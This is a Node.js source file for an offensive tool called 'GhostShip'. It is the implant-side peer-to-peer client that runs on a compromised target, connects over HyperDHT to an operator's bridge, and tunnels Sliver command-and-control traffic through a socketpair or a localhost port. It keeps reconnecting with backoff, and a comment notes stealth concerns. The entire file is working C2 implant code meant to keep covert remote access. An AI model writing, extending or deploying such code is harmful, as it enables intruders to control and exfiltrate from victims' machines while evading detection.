/*
 * GhostShip Implant-Side P2P Client
 *
 * This script runs on the target machine inside the implant.
 * It connects to the operator's bridge via HyperDHT and pipes
 * traffic to/from the Sliver payload through a socketpair fd.
 *
 * Usage: node client.js <connection-key>
 *   connection-key: hs://<public-key-hex> from the operator's bridge
 *
 * Environment:
 *   GS_PIPE_FD: File descriptor number for the socketpair (set by loader)
 */

const net = require('net');
const fs = require('fs');
const HyperDHT = require('hyperdht');

/* Parse connection key from command line */
const connKey = process.argv[2];
if (!connKey || !connKey.startsWith('hs://')) {
    console.error('[!] Usage: node client.js hs://<connection-key>');
    process.exit(1);
}

/* Extract public key hex from connection string */
const publicKeyHex = connKey.replace('hs://', '');
const publicKey = Buffer.from(publicKeyHex, 'hex');

if (publicKey.length !== 32) {
    console.error('[!] Invalid connection key length');
    process.exit(1);
}

/* Get pipe fd from environment */
const pipeFdStr = process.env.GS_PIPE_FD;
let pipeStream = null;

if (pipeFdStr) {
    const pipeFd = parseInt(pipeFdStr, 10);
    if (!isNaN(pipeFd) && pipeFd >= 0) {
        try {
            /* Create duplex stream from file descriptor */
            pipeStream = new net.Socket({ fd: pipeFd, readable: true, writable: true });
            console.log(`[*] Using pipe fd: ${pipeFd}`);
        } catch (err) {
            console.error(`[!] Failed to open pipe fd ${pipeFd}:`, err.message);
        }
    }
}

/* Initialize DHT */
const dht = new HyperDHT();

async function connectToBridge() {
    console.log('[*] GhostShip Client Starting...');
    console.log(`[*] Connecting to: ${connKey.substring(0, 20)}...`);

    try {
        /* Connect to the bridge via DHT */
        const socket = dht.connect(publicKey);

        socket.on('open', () => {
            console.log('[+] P2P Connection established');

            if (pipeStream) {
                /* Pipe mode: bidirectional pipe between DHT and socketpair */
                console.log('[*] Piping to local socketpair');

                socket.pipe(pipeStream);
                pipeStream.pipe(socket);

                pipeStream.on('error', (err) => {
                    console.error('[!] Pipe error:', err.message);
                    socket.destroy();
                });

                pipeStream.on('close', () => {
                    console.log('[*] Pipe closed');
                    socket.destroy();
                });
            } else {
                /*
                 * Fallback: No pipe fd available.
                 * Create a local TCP listener for Sliver to connect to.
                 * This is less stealthy but ensures functionality.
                 */
                console.log('[!] No pipe fd, falling back to TCP localhost:8888');

                const server = net.createServer((localConn) => {
                    console.log('[*] Local connection received');
                    socket.pipe(localConn);
                    localConn.pipe(socket);

                    localConn.on('error', (err) => {
                        console.error('[!] Local connection error:', err.message);
                    });
                });

                server.listen(8888, '127.0.0.1', () => {
                    console.log('[*] Listening on 127.0.0.1:8888');
                });

                server.on('error', (err) => {
                    console.error('[!] Server error:', err.message);
                    socket.destroy();
                });
            }
        });

        socket.on('error', (err) => {
            console.error('[!] DHT connection error:', err.message);
            scheduleReconnect();
        });

        socket.on('close', () => {
            console.log('[*] DHT connection closed');
            scheduleReconnect();
        });

    } catch (err) {
        console.error('[!] Connection failed:', err.message);
        scheduleReconnect();
    }
}

/* Reconnection logic with exponential backoff */
let reconnectAttempts = 0;
const MAX_RECONNECT_DELAY = 300000; /* 5 minutes */

function scheduleReconnect() {
    reconnectAttempts++;
    const delay = Math.min(1000 * Math.pow(2, reconnectAttempts), MAX_RECONNECT_DELAY);
    console.log(`[*] Reconnecting in ${delay / 1000}s (attempt ${reconnectAttempts})`);
    setTimeout(connectToBridge, delay);
}

/* Handle process signals */
process.on('SIGTERM', () => {
    console.log('[*] Received SIGTERM, shutting down');
    dht.destroy();
    process.exit(0);
});

process.on('SIGINT', () => {
    console.log('[*] Received SIGINT, shutting down');
    dht.destroy();
    process.exit(0);
});

/* Start connection */
connectToBridge();
